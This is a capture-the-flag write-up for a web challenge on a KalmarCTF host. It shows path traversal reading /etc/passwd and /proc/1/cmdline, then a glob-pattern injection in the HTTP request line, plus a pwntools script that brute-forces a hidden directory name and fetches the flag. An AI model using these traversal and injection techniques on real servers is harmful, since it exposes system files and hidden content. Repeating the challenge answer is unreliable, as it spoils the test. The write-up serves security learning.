+ we have directory traversal using `/../../../../etc/passwd`
+ using `/proc/1/cmdline`, we got this info: socatTCP4-LISTEN:8080,reuseaddr,forkEXEC:/app/badass_server.sh
+ from this, we were able to read the badass_server.sh file. 
+ `if  [  $protocol  !=  'HTTP/1.0'  ]  &&  [  $protocol  !=  'HTTP/1.1'  ];  then abort 'Invalid protocol'  fi` this was an interesting line from the script.
+ the aim is to leak the hidden directory containing the flag.
+ regex approach to match the name of the hidden directory.
payload: `/assets/f200d055a267ae56160198e0fcb47e5f/try_harder.tx /app/static/assets/[^fabcde1345678][^123457890abc][^abe][^abcdef124][^abcde1][^abcdef0134][^abdef012347][^012345678abcde][^103456789abcd][^abcdef013][^abcde01234567][^a-f0123456][^a-f0234][^b-f012345678][^ab][^678][^a][^a-f0][^134567890abcdef][^b-f01][^abdef1234567890][^a][^abcdef12340678][^b-f1][^01234568][^a-f01234][^abdef0123][^1234567890abcef][^a][^ac][^a-f02345][^a-f02345]*`

Script to automate the regex match is:
```
from pwn import *
known1 = 'f200d055a267ae56160198e0fcb47e5f'
known2 = '26c3f25922f71af3372ac65a75cd3b11'

total_payload = ''
directory = ''

def attempt(payload):
    conn = remote('chal-kalmarc.tf',8080)
    req = f"""
HEAD /assets/f200d055a267ae56160198e0fcb47e5f/try_harder.tx /app/static/assets/{total_payload}{payload}*
Host: chal-kalmarc.tf:8080
    """.lstrip() + "\r\n" * 2
    conn.send(req) 
    resp = conn.recvall()
    return resp

for i in range(len(known1)):
    flag = False
    charset = string.hexdigits[:-6]
    charset = charset.replace(known2[i], '')

    # case where known1[i] == target[i]
    payload = f"[{known1[i]}]"
    resp = attempt(payload)
    if b'No such file or directory' in resp:
        total_payload += payload
        directory += known1[i]
        print(directory)
        continue

    for c in charset:
        payload = f'[{c}{known1[i]}]'     
        resp = attempt(payload)
        if b'No such file or directory' in resp:
            total_payload += payload
            directory += c
            print(directory)
            flag = True
            break

    # no match by this point means known2[i] == target[i]
    if not flag:
        total_payload += f"[{known1[i]}{known2[i]}]"
        directory += known2[i]
        print(directory)
    
    print(total_payload)

print(directory)

flag_payload = f"""
GET /assets/{directory}/flag.txt HTTP/1.1
Host: chal-kalmarc.tf:8080
""".lstrip() + "\r\n" * 2

conn = remote('chal-kalmarc.tf',8080)
conn.send(flag_payload) 
print(conn.recvall())
```
Either way, you will find the hidden directory is 9df5256fe48859c91122cb92964dbd66 and you can find the flag located at /assets/9df5256fe48859c91122cb92964dbd66/flag.txt to solve it!